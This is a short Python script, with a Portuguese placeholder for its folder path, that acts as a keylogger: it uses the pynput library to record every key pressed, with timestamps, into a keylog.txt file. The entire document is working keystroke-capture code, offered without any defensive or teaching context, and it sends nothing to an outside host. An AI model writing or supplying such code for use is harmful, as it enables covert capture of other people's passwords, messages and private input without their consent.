from pynput.keyboard import Listener
import logging

log_dir = r"COLOQUE O CAMINHO PARA A PASTA KEYLLOGER"
logging.basicConfig(filename = (log_dir + r"/keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()



